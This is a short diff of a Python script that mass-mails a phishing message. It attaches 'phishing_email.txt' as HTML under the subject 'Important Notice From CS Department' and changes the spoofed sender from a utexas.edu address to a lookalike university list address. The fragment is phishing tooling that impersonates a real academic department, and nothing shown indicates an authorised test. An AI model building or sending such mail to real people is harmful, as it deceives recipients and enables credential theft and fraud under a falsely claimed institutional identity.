@@ -121,7 +121,7 @@ for email in email_list:
     print(email)
 
 msg = MIMEMultipart()
-msg['From'] = 'san@utexas.edu'
+msg['From'] = 'san@utlists.utexas.edu'
 msg['Subject'] = 'Important Notice From CS Department'
 phish_mail_file = open('phishing_email.txt', 'rb')
 msg.attach(MIMEText(phish_mail_file.read(), 'html'))
